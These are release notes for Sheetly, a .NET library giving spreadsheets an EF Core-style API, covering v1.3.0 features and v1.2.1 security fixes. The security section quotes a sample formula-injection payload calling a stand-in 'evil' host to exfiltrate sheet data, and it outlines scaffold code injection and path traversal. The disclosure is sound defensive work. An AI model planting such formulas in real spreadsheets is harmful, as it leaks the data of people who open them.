# 🚀 Sheetly v1.3.0 — EF Core Parity, Correctness & Round-Trip

## Entity Framework Core for Spreadsheets

**Release Date:** July 2026

The big one. v1.3.0 makes an EF Core developer feel at home — a full set of familiar APIs — while
finishing the correctness and round-trip work started in v1.2.1. It is a **major upgrade with
breaking changes**; see [BREAKING_CHANGES.md](BREAKING_CHANGES.md) before upgrading.

---

## ✨ EF Core parity

- **`Set<T>()`, `IEntityTypeConfiguration<T>` + `ApplyConfiguration` / `ApplyConfigurationsFromAssembly`, and `ToTable(...)`** — the context surface you expect. `ToTable` is an alias for `HasSheetName`.
- **Range operations & full async LINQ** — `AddRange` / `UpdateRange` / `RemoveRange` / `AddRangeAsync`, and a complete async terminal set on queries: `FirstAsync`, `SingleAsync`, `LastAsync`, `CountAsync(predicate)`, `LongCountAsync`, `AllAsync`, `MaxAsync` / `MinAsync`, `SumAsync` / `AverageAsync`, `ToArrayAsync` / `ToHashSetAsync` / `ToDictionaryAsync`, `AsAsyncEnumerable`, plus composable `Select`, `Distinct` / `DistinctBy`, and `OrderBy(...).ThenBy(...)`.
- **`Ignore` / `[NotMapped]`** — exclude computed or transient properties from the model, via the fluent `Ignore(e => e.X)` or the BCL `[NotMapped]` attribute.
- **`EnsureCreated` / `EnsureDeleted` / `CanConnect`** — CLI-free onboarding. Create every model table straight from your POCOs in one call:

  ```csharp
  await using var ctx = new AppDbContext();   // UseGoogleSheets(...) in OnConfiguring
  await ctx.Database.EnsureCreatedAsync();     // creates the sheets + schema
  ctx.Products.Add(new Product { Title = "Hello", Price = 9.99m });
  await ctx.SaveChangesAsync();
  ```

- **`Entry` / `ChangeTracker`** — `context.Entry(e)` (State, `CurrentValues` / `OriginalValues`, `Property(name)`, `ReloadAsync`), `context.ChangeTracker` (`Entries()`, `Entries<T>()`, `HasChanges()`, `DetectChanges()`, `Clear()`), plus `set.Attach` / `AttachRange` and `set.Local`.
- **Navigation fixup + topological save** — set a reference navigation and the foreign key fills itself in, even from a key generated in the same `SaveChanges`:

  ```csharp
  var cat = new Category { Name = "Tools" };
  var prod = new Product { Title = "Hammer", Category = cat };  // no CategoryId
  ctx.Categories.Add(cat);
  ctx.Products.Add(prod);
  await ctx.SaveChangesAsync();   // cat gets an Id; prod.CategoryId is filled automatically
  ```

  Principals are flushed before their dependents. A navigation pointing at an untracked, keyless
  entity now throws a clear error instead of silently writing a `0` foreign key.
- **`LogTo`** — EF-style simple logging: `options.UseGoogleSheets(...).LogTo(Console.WriteLine, SheetlyLogLevel.Debug)`. Logs SaveChanges summaries, Google API calls and 429 credential rotation, and Excel saves.
- **`ISheetsContextFactory<T>` + `AddSheetsContextFactory<T>()`** — the `IDbContextFactory` analog with real async initialization (no sync-over-async), recommended for ASP.NET and background work.

---

## 🔒 Formula injection fully closed + value round-trip

Writes now use Google's **`RAW`** input mode with native values, and reads use **`UNFORMATTED_VALUE`**:

- User strings are stored **verbatim** and are **never** evaluated as formulas — the v1.2.1
  apostrophe workaround is gone because `RAW` never interprets a leading `=`.
- Numbers and booleans stay native; `DateTime` / `DateTimeOffset` / `TimeSpan` / `Guid` / `enum` /
  `char` serialize to invariant ISO/round-trip text, so values round-trip regardless of machine
  locale (the EU-locale decimal/date corruption is gone). Excel uses typed cell values for the same
  guarantee.

---

## 🐛 Correctness

- **Change tracking** — entities stay tracked after `SaveChanges` (edit-save-edit works); disconnected `Update`/`Remove` of a missing row now raises `DbUpdateConcurrencyException` instead of a silent no-op; cascade delete is planned before the flush and executed against fresh reads so sibling updates and multi-parent cascades can't corrupt rows.
- **Column-order integrity** — lookups and id generation resolve the primary-key column by header, so they keep working when the PK isn't in column A; `DropColumn` physically deletes on Google too (parity with Excel).
- **Validation** — updates that violate a unique constraint now throw; a modified entity no longer conflicts with its own row; foreign-key checks no longer false-positive on a mix of existing and pending parents.
- **Queries** — `AsNoTracking()` / `Include(...)` options no longer leak into the next query on the same set; blank rows are skipped.
- **Migrations** — sheet rewrites are near-atomic (`ReplaceSheetDataAsync`) so an interrupted rewrite can't corrupt the bookkeeping sheets; `migrations remove` refuses to delete an applied migration unless `--force`; `migrations list` shows applied/pending status; scaffolding emits navigation properties instead of `[ForeignKey]`. Unambiguous column renames are detected (a same-type drop+add becomes a data-preserving `RenameColumn`, with a `--no-rename-detection` opt-out), and generated `Down()` methods are self-contained — every constraint is emitted so a rollback re-creates columns exactly.
- **CLI** — the tool resolves provider dependencies (ClosedXML, Google.Apis) from the project's `deps.json`, so a `SheetsContext` that lives in a **class library** works with `database update` / `rollback` / `scaffold`, not only in an executable project.
- **DI** — once a context + connection passes startup verification, the remote migration/model re-check is skipped for the rest of the process, so one context per web request doesn't re-read the history sheet every time.
- **Excel** — writes are buffered and flushed once per `SaveChanges` / migration / dispose instead of a full file save on every cell write.

---

## 🧹 Housekeeping

Dead code removed (`ScaffoldService`, `ContextResolver`, `ExcelScriptGenerator`, a stray `.bak2`), and
**`Sheetly.Core` no longer depends on ClosedXML** — a lighter core package.

---

# 🔒 Sheetly v1.2.1 — Security & Correctness Patch

## Entity Framework Core for Spreadsheets

**Release Date:** July 2026

A focused patch release. No new features and no breaking API changes — upgrade is a drop-in
replacement for v1.2.0. It closes two critical security holes and one silent data-corruption bug.

---

## 🔒 Security fixes

### Spreadsheet formula injection (critical)

End-user text that started with `=`, `+`, `-`, `@`, or a leading control character was written to
the sheet as a **live formula**. A value like `=IMPORTXML("https://evil","//x")` could exfiltrate
row contents when a human opened the shared sheet, and `=HYPERLINK(...)` could phish them. Such
values are now stored as **text literals** (a leading apostrophe marker Google consumes on write) and
are never evaluated as formulas. On read they come back as the original text.

> **Known limitation (fixed fully in v1.3.0):** Sheetly still writes with Google's `USER_ENTERED`
> mode, which coerces *number-* and *date-looking* strings (e.g. `"1,234"`, `"3/4"`, `"TRUE"`) into
> typed cells even when your property is a `string`. The formula-injection class above is closed, but
> if you store such strings in text columns they may not round-trip byte-for-byte until v1.3.0 moves
> writes to `RAW` mode. `decimal`/`double`/`DateTime`/`bool` properties are unaffected.

### Scaffold code injection (critical)

`dotnet sheetly scaffold` generated C# classes from the remote `__SheetlySchema__` sheet without
validating identifiers. Anyone with edit access to a shared spreadsheet could craft a class or
property name that compiled arbitrary code into your project on the next build, or a name like
`../../Program` that wrote outside the output folder. Scaffolded class names, property names, data
types, and file names are now strictly validated and sanitized.

### Sheet-name quoting (low)

A1-notation ranges now escape single quotes in sheet names (`'` → `''`), so a tab whose title
contains an apostrophe can no longer break out of a range reference.

### GitHub Actions hardening

Release workflows no longer interpolate the dispatch `version`/`package` inputs directly into shell
scripts (command-injection gap), and all workflows now declare least-privilege `permissions:`.

---

## 🐛 Correctness fixes

### Column-order data corruption (critical)

Writes were positional by property-declaration order while migrations append new columns at the end
of the sheet. Inserting a property in the **middle** of a model class silently scrambled every
subsequent insert/update — each value landing under the wrong header. Writes are now **header-driven**:
each value is written under its matching column header regardless of physical position. User-added
columns the model doesn't know about are left untouched; a model column missing from the sheet now
raises a clear "apply pending migrations" error instead of corrupting data.

### Model-hash drift on property reorder

Reordering properties (with no add/drop) changed the model hash even though the migration differ saw
no change, leaving the context permanently unable to start. The model hash is now order-insensitive,
and the startup check recomputes both sides so the comparison is algorithm-independent — existing
projects stuck in this state are rescued on upgrade.

### Migration generator compile-safety

Generated migration/snapshot code now escapes newlines, quotes, and backslashes in string values,
formats decimals/doubles with an invariant separator (no more `1,5m` on non-US machines), and
prefixes C#-keyword migration names with `@` — all of which previously produced code that wouldn't compile.

### Empty-schema guards

Migration bookkeeping no longer throws when the `__SheetlySchema__` sheet is present but empty.

---

## 📦 Packages

| Package | Version | Description |
|---|---|---|
| `Sheetly.Core` | 1.2.1 | Core abstractions, migrations, validation |
| `Sheetly.Google` | 1.2.1 | Google Sheets provider |
| `Sheetly.Excel` | 1.2.1 | Local Excel (.xlsx) provider |
| `dotnet-sheetly` | 1.2.1 | CLI tool (global tool) |
| `Sheetly.DependencyInjection` | 1.2.1 | ASP.NET Core DI integration |

---

## ⬆️ Upgrading

Drop-in from v1.2.0 — no code changes required. Behavior notes:

- Strings beginning with `=`, `+`, `-`, `@`, or a control character are now stored as text literals
  (previously they became live formulas). If you *intentionally* stored formulas via Sheetly, they
  will now be text.
- **Existing sheets are not rewritten.** Cells that v1.2.0 already turned into live formulas stay as
  formulas until you overwrite them — this patch only prevents *new* injected writes. Review shared
  sheets that took untrusted input under v1.2.0.
- `scaffold` sanitizes non-identifier class/property names and warns; verify generated files if your
  spreadsheet had unusual column names.

> 🔐 **Also recommended:** keep `credentials.json` out of source control (see the new Security note
> in the README), and share your sheet with the service account using least privilege.
